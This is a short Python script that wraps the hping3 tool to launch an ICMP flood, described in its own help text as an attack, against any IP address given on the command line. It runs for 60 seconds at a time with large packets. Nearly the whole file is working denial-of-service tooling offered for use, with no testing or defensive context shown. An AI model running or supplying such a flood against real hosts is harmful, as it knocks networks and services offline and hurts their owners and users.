import time
import argparse
import subprocess
from datetime import datetime


def execute_hping3_command(ip):
    try:
        # Use the subprocess.run method to execute the hping3 command
        subprocess.run(["timeout", "60s", "hping3", "-1", "-V", "-d", "1200", "-w", "64", "-p", "80", "--flood", ip], check=True)
        print(f"hping3 command executed successfully for {ip}.")
    except subprocess.CalledProcessError as e:
        print(f"Error executing hping3 command for {ip}: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Launches ICMP Flood Attack against a given IP.")
    parser.add_argument("ip_address", help="IP address to attack")

    args = parser.parse_args()
    ip_address = args.ip_address

    print(f"{datetime.now()} Launching ICMP Flood attack against {ip_address}")
    execute_hping3_command(ip_address)